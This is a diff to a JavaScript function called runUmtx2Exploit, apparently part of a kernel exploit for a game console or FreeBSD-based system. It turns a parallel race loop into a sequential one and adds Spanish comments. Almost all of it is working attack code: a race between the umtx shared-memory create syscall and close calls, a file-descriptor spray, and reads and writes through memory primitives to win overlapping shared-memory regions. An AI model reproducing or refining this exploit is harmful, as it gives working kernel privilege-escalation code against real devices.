@@ -805,9 +805,12 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 const beforeRaceTime = performance.now();
 showTemporaryAlert("Triggering race...", LogLevel.LOG);
 
-async function executeRaceAttempt(i, i2) {
-    if (i2 % 4 === 0) await log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
+for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
+    if (i2 % 4 === 0) {  // Reducimos la cantidad de logs para mejorar velocidad
+        log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
+    }
 
+    // Realiza las llamadas al sistema necesarias para la carrera de condiciones
     chain.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, primaryShmKeyBuf);
     chain.write_result(mainFdBuf);
 
@@ -817,28 +820,35 @@ async function executeRaceAttempt(i, i2) {
         chain.self_healing_syscall_2(SYS_CLOSE, mainFdBuf, true);
     });
 
-    await chain.run();
+    await chain.run(); // Ejecutamos todo en un solo `await`
 
+    // Esperamos el estado adecuado de los hilos
     await waitForRaceThreadsState(threadStatus.READY);
+
+    // Manipulación de memoria compartida
     p.write8(commonThreadData.resume, 0);
     p.write8(commonThreadData.start, 1);
+
     await waitForRaceThreadsState(threadStatus.DONE);
 
+    // Leemos valores de memoria optimizando accesos
     let destroyCount = p.read4(destroyerThread0Data.destroyCount) + p.read4(destroyerThread1Data.destroyCount);
     let lookupFd = p.read4(lookupThreadData.fd);
 
+    // Intentamos obtener un descriptor válido
     const fd = await getShmFdFromSize(lookupFd);
     if (fd) {
         winnerFd = fd;
         winnerLookupFd = lookupFd;
-        await log(`Overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
-        return true;
+        log(`Overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
     }
 
+    // Evitamos cerrar descriptores en mal estado
     if (destroyCount === 2 && lookupFd > 3) {
         fdsToFix.push(lookupFd);
     }
 
+    // Cerramos descriptores sobrantes en bloque
     for (let i3 = 0; i3 < config.num_spray_fds * 2; i3++) {
         const addr = sprayFdsBuf.add32(0x8 * i3);
         const fd = p.read4(addr);
@@ -848,27 +858,22 @@ async function executeRaceAttempt(i, i2) {
         chain.push_write8(addr, 0);
     }
 
-    await chain.run();
-    return false;
-}
+    await chain.run(); // Solo ejecutamos `chain.run()` una vez aquí
 
-for (let i2 = 0; i2 < config.max_race_attempts; i2 += 2) {
-    let results = await Promise.allSettled([
-        executeRaceAttempt(i, i2),
-        i2 + 1 < config.max_race_attempts ? executeRaceAttempt(i, i2 + 1) : Promise.resolve(false)
-    ]);
+    // Si hemos ganado la carrera, terminamos
+    if (winnerFd) break;
 
-    if (results.some(result => result.status === "fulfilled" && result.value === true)) break;
-
+    // Reiniciamos estado para el siguiente intento
     await resetCommonData();
     resetLookupThreadState();
     resetDestroyerThread0State();
     resetDestroyerThread1State();
 
-    if (i2 + 2 < config.max_race_attempts) {
+    if (i2 !== config.max_race_attempts - 1) {
         p.write8(commonThreadData.resume, 1);
     }
 }
+
 
 
 
